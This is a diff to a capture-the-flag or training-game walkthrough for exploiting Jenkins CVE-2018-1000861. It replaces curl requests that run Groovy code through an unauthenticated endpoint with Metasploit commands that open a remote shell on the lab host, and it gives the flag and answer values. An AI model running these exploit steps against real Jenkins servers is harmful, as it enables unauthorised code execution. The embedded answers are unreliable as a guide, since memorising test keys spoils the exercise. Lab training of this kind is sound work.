@@ -72,33 +72,44 @@ answer CVE-2018-1000861
 Also accepted: `CVE_2018_1000861`, lowercase variants,
 `descriptorByName_unauth`.
 
-### Phase 3 → curl → exploit + read blueprint
+### Phase 3 → msfconsole → exploit + read blueprint
 
 ```
 cd /mnt/kit/03_metasploit
 cat README
+msfconsole
 ```
 
-Sanity check the unauth Groovy endpoint:
-
+Inside the msfconsole REPL:
 ```
-curl 'http://10.4.12.1:8080/jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?value=println(42)'
-```
-
-Expect: `Result: 42`. Then read the flag file:
-
-```
-curl 'http://10.4.12.1:8080/jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?value=new%20File(%22/var/m0use/blueprint.txt%22).text'
-```
-
-The flag is in the response. Submit:
-
-```
-answer jenkins_was_a_mistake
+search CVE-2018-1000861
+use 0
+show options                     (optional — see what's required)
+set RHOSTS 10.4.12.1
+set LHOST 10.4.12.99
+check                            (confirms target is vulnerable)
+exploit
 ```
 
-Then type `continue` (alias for `exit`) to leave the game shell and
-return to the portal.
+`exploit` fires the payload; you'll see `Command shell session 1
+opened`. The prompt goes blank — you're on the Jenkins box. Read
+the flag file:
+```
+cat /var/m0use/blueprint.txt
+```
+
+The flag value is in the file (line starting with `Flag:`). Then:
+```
+exit          (leaves the session)
+exit          (leaves msfconsole)
+```
+
+Back at the m0usenet prompt, type the flag value:
+```
+jenkins_was_a_mistake
+```
+
+Then `continue` to leave the game shell and return to the portal.
 
 ## TASK 4 — reflection
 
